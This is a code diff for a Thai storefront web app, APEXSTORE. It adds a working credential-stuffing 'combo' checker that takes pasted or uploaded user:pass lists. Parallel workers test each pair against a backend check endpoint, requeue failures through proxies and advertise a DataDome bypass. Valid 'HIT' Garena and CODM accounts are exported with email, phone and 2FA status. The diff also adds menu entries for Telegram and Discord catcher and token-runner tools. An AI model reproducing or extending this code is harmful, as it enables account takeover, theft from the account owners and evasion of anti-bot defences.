@@ -62,6 +62,7 @@ import {
  Wallet,
  Coins,
  MessageSquare,
+ Bot,
  Image as ImageIcon,
  LogIn,
  UserPlus,
@@ -121,7 +122,7 @@ import { SpeedInsights } from "@vercel/speed-insights/react";
 import { useToastStore } from "./lib/toastStore";
 import { ToastContainer } from "./components/ui/Toast";
 import { GlobalErrorBoundary } from "./components/GlobalErrorBoundary";
-import { UserPlan } from "./types";
+import { AccountResult, LogEntry, UserPlan } from "./types";
 const KeyModal = lazy(() => import("./components/modals/KeyModal").then(m => ({ default: m.KeyModal })));
 const ReceiptModal = lazy(() => import("./components/modals/ReceiptModal").then(m => ({ default: m.ReceiptModal })));
 const PopupBanner = lazy(() => import("./components/PopupBanner").then(m => ({ default: m.PopupBanner })));
@@ -183,9 +184,30 @@ const HistoryView = lazy(() =>
    default: module.HistoryView,
  })),
 );
+const CheckerLogsView = lazy(() =>
+ import("./components/CheckerLogsView").then((module) => ({
+   default: module.CheckerLogsView,
+ })),
+);
+
 const ContactView = lazy(() =>
  import("./components/ContactView").then((module) => ({
    default: module.ContactView,
+ })),
+);
+const ApiProxyGenTool = lazy(() =>
+ import("./components/ApiProxyGenTool").then((module) => ({
+   default: module.ApiProxyGenTool,
+ })),
+);
+const AutoDeployTool = lazy(() =>
+ import("./components/AutoDeployTool").then((module) => ({
+   default: module.AutoDeployTool,
+ })),
+);
+const ProxyFreeTool = lazy(() =>
+ import("./components/ProxyFreeTool").then((module) => ({
+   default: module.ProxyFreeTool,
  })),
 );
 const settingsImport = () => import("./components/SettingsView");
@@ -194,11 +216,23 @@ const SettingsView = lazy(() =>
    default: module.SettingsView,
  })),
 );
+const toolsImport = () => import("./components/ToolsView");
+const ToolsView = lazy(() =>
+ toolsImport().then((module) => ({
+   default: module.ToolsView,
+ })),
+);
 const LogCategoriesView = lazy(() =>
  import("./components/LogCategoriesView").then((module) => ({
    default: module.LogCategoriesView,
  })),
 );
+const TwoFAGenerator = lazy(() =>
+ import("./components/TwoFAGenerator").then((module) => ({
+   default: module.TwoFAGenerator,
+ })),
+);
+
 import { CustomCursor } from "./components/CustomCursor";
 
 var TextPaint = `▒▄▀▄▒█▀▄▒██▀░▀▄▀
@@ -253,6 +287,46 @@ function ElapsedTimeDisplay({
    <div className="px-3 py-1 bg-[#09090b] border border-[#1e1e1e] border text-xs font-mono text-muted-foreground font-medium">
      {elapsedTime}
    </div>
+ );
+}
+
+function ComboTextarea({
+ initialValue,
+ onChangeDebounced,
+ disabled,
+}: {
+ initialValue: string;
+ onChangeDebounced: (val: string) => void;
+ disabled: boolean;
+}) {
+ const [val, setVal] = useState(initialValue);
+ const timerRef = useRef<any>(null);
+
+ useEffect(() => {
+   if (initialValue && initialValue !== val) {
+     setVal(initialValue);
+   }
+ }, [initialValue]);
+
+ const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
+   const newVal = e.target.value;
+   setVal(newVal);
+   if (timerRef.current) clearTimeout(timerRef.current);
+   timerRef.current = setTimeout(() => {
+     onChangeDebounced(newVal);
+   }, 400); // 400ms debounce
+ };
+
+ return (
+   <textarea
+     value={val}
+     onChange={handleChange}
+     rows={12}
+     disabled={disabled}
+     className={`w-full bg-[#09090b] border border-[#1e1e1e] border p-3 text-[11px] font-mono text-[#10b981] focus:border-emerald-500/50 focus:outline-none resize-none transition-all scrollbar-thin scrollbar-thumb-zinc-800 h-[320px] ${disabled ? "opacity-50 cursor-not-allowed" : ""}`}
+     placeholder={"user:pass\nuser|pass"}
+     spellCheck="false"
+   />
  );
 }
 
@@ -410,7 +484,7 @@ function AppContent() {
      { id: "premium_app", name: "แอปพรีเมียม / บันเทิง", title: "แอปพรีเมียม / บันเทิง" },
      { id: "gaming_id", name: "ไอดีเกมส์ยอดนิยม", title: "ไอดีเกมส์ยอดนิยม" },
      { id: "license_key", name: "คีย์ใบอนุญาต / โปรแกรม", title: "คีย์ใบอนุญาต / โปรแกรม" },
-     
+     { id: "proxy", name: "พร็อกซีเซสชั่นขั้นสูง", title: "พร็อกซีเซสชั่นขั้นสูง" }
    ];
  });
 
@@ -436,14 +510,15 @@ function AppContent() {
    | "discord_catcher"
    | "discord_on"
    | "discord_badge"
-  
-    
-  
-  
+   | "two_fa_generator"
+   | "proxy_ff_ios"
+   | "proxy_free"
+   | "api_proxy_gen"
+   | "auto_deploy"
    | "admin"
    | "profile"
    | "logs"
-  
+   | "checker_logs"
    | "history"
    | "wallet_history"
    | "order_history"
@@ -457,7 +532,7 @@ function AppContent() {
    | "product_detail"
    | "custom_page"
    | "log_categories"
-  
+   | "tools"
    | "vip_logs"
    | "free_logs"
    | "my_orders";
@@ -484,7 +559,7 @@ function AppContent() {
    if (targetPath === "topup") return "wallet";
    if (targetPath === "store") return "categories";
    
-   const validViews = ["landing", "home", "search", "categories", "category_products", "dashboard", "admin", "profile", "logs", "history", "wallet_history", "order_history", "random_history", "settings", "contact", "login", "signup", "wallet", "redeem", "product_detail", "custom_page", "log_categories", "vip_logs", "free_logs", "my_orders"];
+   const validViews = ["landing", "home", "search", "categories", "category_products", "dashboard", "admin", "profile", "logs", "checker_logs", "history", "wallet_history", "order_history", "random_history", "settings", "contact", "login", "signup", "wallet", "redeem", "product_detail", "custom_page", "log_categories", "tools", "vip_logs", "free_logs", "my_orders"];
    if (validViews.includes(targetPath)) return targetPath as ViewType;
    
    return "home";
@@ -555,9 +630,12 @@ function AppContent() {
        "discord_on",
        "discord_badge",
        "two_fa_generator",
+       "api_proxy_gen",
+       "proxy_free",
        "admin",
        "profile",
        "logs",
+       "checker_logs",
        "history",
        "settings",
        "contact",
@@ -616,14 +694,14 @@ function AppContent() {
    }
  }, [isAdmin]);
 
-
-
-
-
-
-
-
-
+ const [combo, setCombo] = useState("");
+ const comboRef = useRef("");
+ const [running, setRunning] = useState(false);
+ const runningRef = useRef(false);
+ const [validAccounts, setValidAccounts] = useState<AccountResult[]>([]);
+ const [invalidCount, setInvalidCount] = useState(0);
+ const [totalChecked, setTotalChecked] = useState(0);
+ const [logs, setLogs] = useState<LogEntry[]>([]);
  const logDivRef = useRef<HTMLDivElement>(null);
 
  const [startTime, setStartTime] = useState<number | null>(null);
@@ -641,9 +719,11 @@ function AppContent() {
  const [logoClicks, setLogoClicks] = useState(0);
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [dailyUsage, setDailyUsage] = useState<number>(0);
-
-
-
+ const [showTurnstileModal, setShowTurnstileModal] = useState(false);
+ const [pendingTurnstileToken, setPendingTurnstileToken] = useState<
+   string | null
+ >(null);
+ const [savedLinesToCheck, setSavedLinesToCheck] = useState<string[]>([]);
  const rawEnvKey = (import.meta.env.TURNSTILE_SITE_KEY || "").trim();
  const TURNSTILE_SITE_KEY =
    rawEnvKey.length > 5 ? rawEnvKey : "0x4AAAAAADDNPyGBIV4MApep";
@@ -1262,10 +1342,47 @@ function AppContent() {
    let dataReady = false;
 
    const initApp = async () => {
-      const savedUserPlan = localStorage.getItem("checker_userplan_main");
-      if (savedUserPlan) setUserPlan(JSON.parse(savedUserPlan));
+     // Load local storage data using a static key, independent of IP so VPN works
+     const savedLogs = localStorage.getItem(`checker_logs_main`);
+     const savedUserPlan = localStorage.getItem(`checker_userplan_main`);
+     const savedDailyUsage = localStorage.getItem(`checker_usage_main`);
+     const savedLastDate = localStorage.getItem(`checker_lastdate_main`);
 
-      // Fast check if cache resources exist to bypass loading screen delays
+     // Clear any legacy unsafe sensitive data
+     localStorage.removeItem(`checker_combo_main`);
+     localStorage.removeItem(`checker_valid_main`);
+     localStorage.removeItem(`checker_invalid_main`);
+     localStorage.removeItem(`checker_total_main`);
+
+     const todayDate = new Date().toISOString().slice(0, 10);
+     if (savedLastDate === todayDate) {
+       setDailyUsage(Number(savedDailyUsage) || 0);
+     } else {
+       setDailyUsage(0);
+     }
+     setLastUsageDate(todayDate);
+
+     if (savedUserPlan) setUserPlan(JSON.parse(savedUserPlan));
+
+     // Removed loading combo and valid accounts from local storage to prevent XSS leakage
+     // Combo data must be loaded server side or kept entirely in memory
+
+     if (savedLogs && JSON.parse(savedLogs).length > 0) {
+       setLogs(JSON.parse(savedLogs));
+     } else {
+       console.log("Welcome to APEXSTORE System");
+       setLogs([
+         {
+           id: Math.random().toString(36).substring(2, 9),
+           time: new Date().toLocaleTimeString("th-TH"),
+           text: "System Ready - Backend connected.",
+           iconName: "check",
+           colorClass: "text-green-500",
+         },
+       ]);
+     }
+
+     // Fast check if cache resources exist to bypass loading screen delays
      const hasCachedStats = !!localStorage.getItem("apex_stats_cache");
      const hasCachedProducts = !!localStorage.getItem("apex_products_cache");
      const hasCachedCategories = !!localStorage.getItem("apex_categories_cache");
@@ -1308,6 +1425,69 @@ function AppContent() {
     };
     initApp();
   }, [fetchAllData]);
+
+ // Sync combo to ref for high-speed access
+ useEffect(() => {
+   comboRef.current = combo;
+ }, [combo]);
+
+ useEffect(() => {
+   if (running) {
+     setStartTime(performance.now());
+   } else {
+     setStartTime(null);
+   }
+ }, [running]);
+
+ // Save Data locally (independent of IP for VPN compatibility)
+ useEffect(() => {
+   if (!isLoaded || !clientIp) return;
+   localStorage.setItem(`checker_logs_main`, JSON.stringify(logs.slice(-100))); // Keep last 100
+ }, [logs, isLoaded, clientIp]);
+
+ useEffect(() => {
+   if (!isLoaded || !clientIp) return;
+   localStorage.setItem(`checker_usage_main`, dailyUsage.toString());
+ }, [dailyUsage, isLoaded, clientIp]);
+
+ useEffect(() => {
+   if (!isLoaded || !clientIp) return;
+   localStorage.setItem(`checker_lastdate_main`, lastUsageDate);
+ }, [lastUsageDate, isLoaded, clientIp]);
+
+ // No superficial security - focus on data integrity instead
+ useEffect(() => {
+   // F12 blocks are easily bypassed, removed for better developer experience
+ }, []);
+
+ // Auto-scroll logs
+ useEffect(() => {
+   if (logDivRef.current) {
+     logDivRef.current.scrollTop = logDivRef.current.scrollHeight;
+   }
+ }, [logs]);
+
+ const addLog = (
+   text: string,
+   iconName: string,
+   colorClass: string = "text-zinc-300",
+ ) => {
+   setLogs((prev) => {
+     const nextLogs = [
+       ...prev,
+       {
+         id: Math.random().toString(36).substring(2, 9),
+         time: new Date().toLocaleTimeString("th-TH"),
+         text,
+         iconName,
+         colorClass,
+       },
+     ];
+     return nextLogs.length > 200
+       ? nextLogs.slice(nextLogs.length - 200)
+       : nextLogs;
+   });
+ };
 
  const delay = (ms: number) =>
    new Promise((resolve) => setTimeout(resolve, ms));
@@ -1631,6 +1811,414 @@ function AppContent() {
    }
  };
 
+ const checkSingle = async (
+   acc: string,
+   pass: string,
+   index: number,
+   cToken?: string | null,
+   pool?: string[],
+   originalLine?: string,
+ ) => {
+   let retries = 2; // Up to 2 retries for proxy errors
+   while (retries >= 0 && runningRef.current) {
+     try {
+       if (retries < 2) {
+         // addLog omitted for cleaner UI
+       }
+
+       const response = await axios.post(`/api/check`, {
+         account: acc,
+         password: pass,
+         turnstileToken: cToken,
+       });
+       const result = response.data;
+
+       if (result.success) {
+         addLog(
+           `[${index + 1}] Auth [OK] -> ${acc}`,
+           "key",
+           "text-[#10b981] font-medium",
+         );
+         const newResult: AccountResult = {
+           ...result.data,
+           cleanAt: new Date().toLocaleDateString("th-TH"),
+           skins: result.data.skins || 0,
+         };
+
+         setValidAccounts((prev) => [newResult, ...prev]);
+         addLog(
+           `[${index + 1}] HIT: ${acc}`,
+           "check",
+           "text-[#10b981] font-medium",
+         );
+         return;
+       } else {
+         let errorMsg = result.error || "Check failed";
+         if (typeof errorMsg === "object") {
+           try {
+             errorMsg = JSON.stringify(errorMsg);
+           } catch (e) {
+             errorMsg = String(errorMsg);
+           }
+         }
+
+         if (
+           result.isProxyError ||
+           (typeof errorMsg === "string" && errorMsg.includes("Proxy"))
+         ) {
+           if (pool && originalLine) {
+             pool.push(originalLine); // Put back to queue to retry later
+             return;
+           }
+           if (retries > 0) {
+             retries--;
+             continue;
+           }
+         }
+
+         const isRateLimit =
+           typeof errorMsg === "string" &&
+           (errorMsg.includes("error_too_many_requests") ||
+             errorMsg.includes("Too many requests") ||
+             errorMsg.includes("(403)"));
+
+         if (!isRateLimit) {
+           if (result.isProxyError) {
+             if (pool && originalLine) {
+               pool.push(originalLine);
+               return;
+             }
+           } else {
+             setInvalidCount((prev) => prev + 1);
+             addLog(
+               `[${index + 1}] FAIL: ${acc} - ${errorMsg}`,
+               "x",
+               "text-red-500",
+             );
+           }
+         } else {
+           addLog(
+             `[${index + 1}] WARN: Rate Limit / IP Blocked. Pausing...`,
+             "alert-triangle",
+             "text-amber-400",
+           );
+           setRunning(false);
+           runningRef.current = false;
+         }
+         return;
+       }
+     } catch (err: any) {
+       let errMsg = err.response?.data?.error || err.message;
+       if (typeof errMsg === "object") {
+         try {
+           errMsg = JSON.stringify(errMsg);
+         } catch (e) {
+           errMsg = String(errMsg);
+         }
+       }
+
+       const isProxy =
+         err.response?.data?.isProxyError ||
+         (typeof errMsg === "string" && errMsg.includes("Proxy")) ||
+         errMsg.includes("timeout") ||
+         err.code === "ECONNABORTED";
+
+       if (isProxy) {
+         if (pool && originalLine) {
+           pool.push(originalLine); // Requeue!
+           return;
+         }
+         if (retries > 0) {
+           retries--;
+           continue;
+         }
+       }
+
+       if (isProxy) {
+         if (pool && originalLine) {
+           pool.push(originalLine); // Requeue!
+           return;
+         }
+       } else {
+         setInvalidCount((prev) => prev + 1);
+         console.error(`Check failed for ${acc}:`, err);
+         addLog(
+           `[${index + 1}] ERR: ${acc} - ${errMsg}`,
+           "x",
+           "text-red-500 font-medium",
+         );
+       }
+       return;
+     }
+   }
+ };
+
+ const startCheck = async () => {
+   if (running) return;
+   const text = comboRef.current;
+   if (!text.trim()) {
+     Swal.fire({ title: "ข้อผิดพลาด", text: "ไม่มี Combo", icon: "error" });
+     return;
+   }
+
+   const lines = text
+     .trim()
+     .split("\n")
+     .map((l) => l.trim())
+     .filter((l) => l.includes(":"));
+   if (lines.length === 0) {
+     Swal.fire({
+       title: "ข้อผิดพลาด",
+       text: "รูปแบบข้อมูลไม่ถูกต้อง (ต้องมี : )",
+       icon: "error",
+     });
+     return;
+   }
+
+   let linesToCheck = lines;
+   setSavedLinesToCheck(linesToCheck);
+
+   // Always show Turnstile modal to fetch a real token, even for premium (Turnstile is invisible for good users)
+   setPendingTurnstileToken(null);
+   setShowTurnstileModal(true);
+ };
+
+ const executeCheck = async (
+   token: string,
+   linesArg: string[] = savedLinesToCheck,
+ ) => {
+   setRunning(true);
+   runningRef.current = true;
+   setValidAccounts([]);
+   setInvalidCount(0);
+   setTotalChecked(0);
+
+   addLog(
+     `เริ่มตรวจสอบ... ทั้งหมด ${linesArg.length} รายการ [DataDome Bypass: ACTIVE] Threads: ${threads}`,
+     "terminal",
+     "text-[#10b981]",
+   );
+
+   const pool = [...linesArg];
+   let active = 0;
+
+   const worker = async () => {
+     while (pool.length > 0 && runningRef.current) {
+       const line = pool.shift();
+       if (!line) break;
+       const index = linesArg.indexOf(line);
+       let acc = "";
+       let pass = "";
+       const firstColon = line.indexOf(":");
+       if (firstColon !== -1) {
+         const parts = line.split(":");
+         if (parts.length >= 3 && parts[1].includes("@")) {
+           acc = parts[1];
+           const secondColon = line.indexOf(":", firstColon + 1);
+           pass = line.substring(secondColon + 1);
+         } else {
+           acc = parts[0];
+           pass = line.substring(firstColon + 1);
+         }
+       }
+
+       if (acc && pass) {
+         active++;
+         await checkSingle(acc.trim(), pass.trim(), index, token, pool, line);
+         if (!userPlan?.isPremium) {
+           setDailyUsage((prev) => prev + 1);
+         }
+         active--;
+       }
+     }
+   };
+
+   const workers = [];
+   for (let i = 0; i < Math.min(threads, linesArg.length); i++) {
+     workers.push(worker());
+   }
+
+   await Promise.all(workers);
+
+   setRunning(false);
+   runningRef.current = false;
+   addLog("ตรวจสอบเสร็จสิ้น", "check", "text-green-400 font-medium");
+ };
+
+ const fileInputRef = useRef<HTMLInputElement>(null);
+
+ const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+   const file = e.target.files?.[0];
+   if (!file) return;
+
+   if (!file.name.toLowerCase().endsWith(".txt")) {
+     Swal.fire({
+       title: "ข้อผิดพลาด",
+       text: "รองรับเฉพาะไฟล์ .txt เท่านั้น",
+       icon: "error",
+     });
+     if (fileInputRef.current) fileInputRef.current.value = "";
+     return;
+   }
+
+   const reader = new FileReader();
+   reader.onload = (event) => {
+     const text = event.target?.result as string;
+     setCombo((prev) => (prev ? prev + "\n" + text : text));
+     Swal.fire({
+       title: "สำเร็จ",
+       text: "นำเข้าข้อมูลจากไฟล์ .txt สำเร็จ",
+       icon: "success",
+       timer: 1500,
+       showConfirmButton: false,
+     });
+     if (fileInputRef.current) fileInputRef.current.value = "";
+   };
+   reader.readAsText(file);
+ };
+
+ const stopCheck = () => {
+   if (!running) return;
+   setRunning(false);
+   runningRef.current = false;
+   addLog("⛔ หยุดตามคำสั่ง", "square", "text-orange-400");
+ };
+
+ const clearLog = () => {
+   setLogs([]);
+ };
+
+ const downloadFile = (name: string, content: string) => {
+   const blob = new Blob([content], { type: "text/plain" });
+   const url = URL.createObjectURL(blob);
+   const a = document.createElement("a");
+   a.href = url;
+   a.download = name;
+   a.click();
+   URL.revokeObjectURL(url);
+ };
+
+ const exportClean = () => {
+   const data = validAccounts.filter((a) => a.isClean);
+   if (!data.length)
+     return Swal.fire({
+       title: "ข้อมูล",
+       text: "ไม่พบบัญชีปกติ (Clean)",
+       icon: "info",
+     });
+   downloadFile(
+     `Clean_Accounts_${new Date().toISOString().slice(0, 10)}.txt`,
+     data.map((a) => `${a.account}:${a.password}`).join("\n"),
+   );
+   Swal.fire({ title: "สำเร็จ", text: "บันทึกไฟล์สำเร็จ", icon: "success" });
+ };
+
+ const exportBound = () => {
+   const data = validAccounts.filter((a) => !a.isClean);
+   if (!data.length)
+     return Swal.fire({
+       title: "ข้อมูล",
+       text: "ไม่พบบัญชีเชื่อมโยง (Bound)",
+       icon: "info",
+     });
+   downloadFile(
+     `Bound_Accounts_${new Date().toISOString().slice(0, 10)}.txt`,
+     data.map((a) => `${a.account}:${a.password}`).join("\n"),
+   );
+   Swal.fire({ title: "สำเร็จ", text: "บันทึกไฟล์สำเร็จ", icon: "success" });
+ };
+
+ const exportRov = () => {
+   const data = validAccounts.filter((a) => a.hasRov);
+   if (!data.length)
+     return Swal.fire({
+       title: "ข้อมูล",
+       text: "ไม่พบบัญชี ROV",
+       icon: "info",
+     });
+   downloadFile(
+     `ROV_Accounts_${new Date().toISOString().slice(0, 10)}.txt`,
+     data
+       .map(
+         (a) =>
+           `${a.account}:${a.password} | Char: ${a.rovCharacter} | ${a.rovClean ? "Clean" : "Bound"}`,
+       )
+       .join("\n"),
+   );
+   Swal.fire({ title: "สำเร็จ", text: "บันทึกไฟล์สำเร็จ", icon: "success" });
+ };
+
+ const exportAllValid = () => {
+   if (!validAccounts.length)
+     return Swal.fire({
+       title: "คำเตือน",
+       text: "ไม่มีข้อมูลบัญชีที่ผ่าน",
+       icon: "warning",
+     });
+   const text = validAccounts
+     .map(
+       (a) =>
+         `[✔] Login Successful\n\n` +
+         `[ACCOUNT INFO]\n` +
+         `• Username: ${a.account}:${a.password}\n` +
+         `• Last Login: ${a.lastLoginDate || "N/A"}\n` +
+         `• Location: ${a.lastLoginSource || "Unknown"} (${a.lastLoginCountry || "Unknown"})\n` +
+         `• IP Address: ${a.lastLoginIp || "N/A"}\n` +
+         `• Login Country: ${a.lastLoginCountry || "N/A"}\n` +
+         `• User Country: ${a.region}\n\n` +
+         `[ACCOUNT DETAILS]\n` +
+         `• Garena Shells: ${a.shells}\n` +
+         `• Avatar URL: ${a.avatarUrl && a.avatarUrl !== "N/A" ? a.avatarUrl : "No Avatar"}\n` +
+         `• Mobile No: ${a.mobileNumber || "N/A"}\n` +
+         `• Email: ${a.emailAddress || "N/A"} (${a.emailVerified ? "Verified" : "Not Verified"})\n` +
+         `• Facebook Username: ${a.fbUsername || "N/A"}\n\n` +
+         `[GAME INFO]\n` +
+         `${a.otherGames.join("\n") || "No game connections found"}\n` +
+         (a.codmNickname && a.codmNickname !== "N/A"
+           ? `\n[+] CODM Info:\nName: ${a.codmNickname} | Level: ${a.level} | Region: ${a.codmRegion || "N/A"} ${a.codmRegionFlag || ""}\nUID: ${a.codmUid || "N/A"} | OpenID: ${a.codmOpenId || "N/A"}\n`
+           : "") +
+         `\n[SECURITY STATUS]\n` +
+         `• Mobile Bound: ${a.phoneBound ? "Yes" : "No"}\n` +
+         `• Email Verified: ${a.emailVerified ? "Verified" : "Not Verified"}\n` +
+         `• Facebook Linked: ${a.fbLinked ? "Yes" : "No"}\n` +
+         `• Authenticator: ${a.authenticatorEnabled ? "Enabled" : "Disabled"}\n` +
+         `• 2FA Enabled: ${a.twoFaEnabled ? "Enabled" : "Disabled"}\n` +
+         `• Account Status: ${a.isClean ? "Clean" : "Bound"}\n\n` +
+         `---------------------[ NEXT ]---------------------`,
+     )
+     .join("\n\n");
+   downloadFile(
+     `All_Valid_Detailed_${new Date().toISOString().slice(0, 10)}.txt`,
+     text,
+   );
+   Swal.fire({
+     title: "สำเร็จ",
+     text: "บันทึกไฟล์รายละเอียดสำเร็จ",
+     icon: "success",
+   });
+ };
+
+ const downloadValidDetail = () => {
+   if (!validAccounts.length)
+     return Swal.fire({
+       title: "ข้อมูล",
+       text: "ไม่มีข้อมูลบัญชีที่ผ่าน",
+       icon: "info",
+     });
+   const content = JSON.stringify(validAccounts, null, 2);
+   downloadFile(
+     `Apex_Database_Export_${new Date().toISOString().slice(0, 10)}.json`,
+     content,
+   );
+   Swal.fire({
+     title: "สำเร็จ",
+     text: "ส่งออกฐานข้อมูลสำเร็จ",
+     icon: "success",
+     background: "#09090b",
+     color: "#fff",
+   });
+ };
+
  const [useCustomCursor, setUseCustomCursor] = useState(() => {
    // Disable custom cursor automatically on touch devices (pointer: coarse)
    if (typeof window !== 'undefined' && window.matchMedia("(pointer: coarse)").matches) {
@@ -1696,7 +2284,13 @@ function AppContent() {
      case "wallet_history": return "ประวัติเติมเงิน";
      case "random_history": return "ประวัติการสุ่มสินค้า";
      case "admin": return "จัดการหลังบ้าน";
-                                   default: return "APEXSTORE";
+     case "telegram_catcher": return "ดักซองเทเลแกรม";
+     case "discord_catcher": return "ดักซองดิสคอร์ด";
+     case "discord_on": return "รันโทเค่นดิสคอร์ด";
+     case "discord_badge": return "รับตราอัตโนมัติ";
+     case "two_fa_generator": return "สร้างรหัส 2FA";
+     case "proxy_free": return "พร็อกซี่ฟรี (Proxy)";
+     default: return "APEXSTORE";
    }
  };
 
@@ -1796,6 +2390,46 @@ function AppContent() {
                <button onClick={() => { setActiveView("signup"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className="w-full flex items-center justify-center py-1.5 bg-[#111] text-white font-medium rounded-md border border-[#222] transition-all hover:bg-[#222] active:scale-95">สมัครสมาชิก</button>
              </div>
             </div>
+         )}
+
+         {/* Tools */}
+         {user && (
+           <div>
+             <div 
+               className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider flex items-center justify-between cursor-pointer"
+               onClick={() => setIsDesktopToolsOpen(!isDesktopToolsOpen)}
+             >
+               <span>UTILITIES</span>
+               <motion.div
+                 animate={{ rotate: isDesktopToolsOpen ? 180 : 0 }}
+                 transition={{ duration: 0.2 }}
+               >
+                 <ChevronDown className="w-3.5 h-3.5" />
+               </motion.div>
+             </div>
+             <AnimatePresence>
+               {isDesktopToolsOpen && (
+                 <motion.div
+                    initial={{ height: 0, opacity: 0 }}
+                    animate={{ height: "auto", opacity: 1 }}
+                    exit={{ height: 0, opacity: 0 }}
+                    transition={{ duration: 0.2, ease: "easeInOut" }}
+                    className="overflow-hidden"
+                 >
+                   <div className="flex flex-col gap-0.5">
+                     {["telegram_catcher:ดักซองเทเลแกรม", "discord_catcher:ดักซองดิสคอร์ด", "discord_on:รันโทเค่นดิสคอร์ด", "discord_badge:รับตราอัตโนมัติ", "two_fa_generator:สร้างรหัส 2FA", "proxy_free:พร็อกซี่ฟรี"].map(str => {
+                        const [vid, lbl] = str.split(':');
+                        return (
+                          <button key={vid} onClick={() => setActiveView(vid)} className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${activeView === vid ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
+                            <ArrowUpRight className="w-4 h-4" /> {lbl}
+                          </button>
+                        );
+                     })}
+                   </div>
+                 </motion.div>
+               )}
+             </AnimatePresence>
+           </div>
          )}
 
          {/* Admin / Logout */}
@@ -2006,7 +2640,7 @@ function AppContent() {
                             className="overflow-hidden"
                          >
                            <div className="flex flex-col gap-0.5">
-                             {[].map(str => {
+                             {["telegram_catcher:ดักซองเทเลแกรม", "discord_catcher:ดักซองดิสคอร์ด", "discord_on:รันโทเค่นดิสคอร์ด", "discord_badge:รับตราอัตโนมัติ", "two_fa_generator:สร้างรหัส 2FA", "proxy_free:พร็อกซี่ฟรี"].map(str => {
                                const [vid, lbl] = str.split(':');
                                return (
                                  <button key={vid} onClick={() => { setActiveView(vid); setIsMobileMenuOpen(false); window.scrollTo({ top: 0, behavior: "smooth" }); }} className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${activeView === vid ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
@@ -2163,10 +2797,12 @@ function AppContent() {
                )}
              />
            )}
-           
-           
-           
-           
+           {activeView === "two_fa_generator" && <TwoFAGenerator />}
+           {activeView === "proxy_free" && <ProxyFreeTool />}
+           {activeView === "api_proxy_gen" && <ApiProxyGenTool />}
+           {activeView === "auto_deploy" && (
+             <AutoDeployTool onBack={() => setActiveView("tools")} />
+           )}
            {activeView === "logs" && (
              <HistoryLogsView
                usedKeysHistory={usedKeysHistory.filter(
@@ -2180,10 +2816,133 @@ function AppContent() {
                )}
              />
            )}
+           {(activeView as string) === "checker_logs" && (
+             <CheckerLogsView
+               logs={logs}
+               onBack={() => setActiveView("home")}
+             />
+           )}
+           {activeView === "log_categories" && (
+             <LogCategoriesView
+               userPlan={userPlan}
+               isAdmin={isAdmin}
+               onNavigateAction={(action) =>
+                 setActiveView(action as void | any)
+               }
+               filterType="all"
+             />
+           )}
+           {activeView === "vip_logs" && (
+             <LogCategoriesView
+               userPlan={userPlan}
+               isAdmin={isAdmin}
+               onNavigateAction={(action) =>
+                 setActiveView(action as void | any)
+               }
+               filterType="vip"
+             />
+           )}
+           {activeView === "free_logs" && (
+             <LogCategoriesView
+               userPlan={userPlan}
+               isAdmin={isAdmin}
+               onNavigateAction={(action) =>
+                 setActiveView(action as void | any)
+               }
+               filterType="free"
+             />
+           )}
+           {activeView === "history" && (
+             <HistoryView
+               purchaseHistory={purchaseHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+               topupHistory={topupHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+               usedKeysHistory={usedKeysHistory.filter(
+                 (h) => h.uid === user?.id,
+               )}
+             />
+           )}
+           {activeView === "order_history" && (
+             <HistoryView
+               purchaseHistory={purchaseHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+               topupHistory={topupHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+               usedKeysHistory={usedKeysHistory.filter(
+                 (h) => h.uid === user?.id,
+               )}
+               defaultTab="normal_product"
+             />
+           )}
+           {activeView === "random_history" && (
+             <HistoryView
+               purchaseHistory={purchaseHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+               topupHistory={topupHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+               usedKeysHistory={usedKeysHistory.filter(
+                 (h) => h.uid === user?.id,
+               )}
+               defaultTab="special_product"
+             />
+           )}
+           {activeView === "wallet_history" && (
+             <HistoryView
+               purchaseHistory={purchaseHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+               topupHistory={topupHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+               usedKeysHistory={usedKeysHistory.filter(
+                 (h) => h.uid === user?.id,
+               )}
+               defaultTab="topup_gift"
+             />
+           )}
+           {activeView === "my_orders" && (
+             <MyOrdersView
+               purchaseHistory={purchaseHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+               topupHistory={topupHistory.filter(
+                 (h) => h.uid === user?.id || h.userId === user?.id,
+               )}
+             />
+           )}
+           {activeView === "settings" && (
+             <SettingsView setActiveView={setActiveView} user={user} useCustomCursor={useCustomCursor} toggleCustomCursor={toggleCustomCursor} />
+           )}
+           {activeView === "tools" && (
+             <ToolsView setActiveView={setActiveView} />
+           )}
+           {activeView === "wallet" && (
+             <WalletView
+               userPlan={userPlan}
+               setUserPlan={setUserPlan}
+               userId={user?.uid}
+               siteSettings={siteSettings}
+               onTopupSuccess={(entry) => {
+                 setTopupHistory((prev) => [entry, ...prev]);
+                 setSiteStats((prev) => ({
+                   ...prev,
+                   topups:
+                     (prev.topups || 0) + (entry.amount || entry.money || 0),
+                 }));
+               }}
+             />
+           )}
            {activeView === "admin" && isAdmin && (
              <AdminDashboard
-
-
+               totalChecked={totalChecked}
+               validAccounts={validAccounts}
                licenseKeys={licenseKeys}
                usedKeysHistory={usedKeysHistory}
                blockedIPs={blockedIPs}
@@ -2281,7 +3040,7 @@ function AppContent() {
                        ตามข้อบังคับและเพื่อความปลอดภัย เรามีการเก็บบันทึก IP
                        Address, Browser Agent, เวลาเข้าระบบ
                        และพฤติกรรมการใช้งาน
-                       เพื่อใช้เป็นหลักฐานและป้องกันเหตุโจมตีระบบ
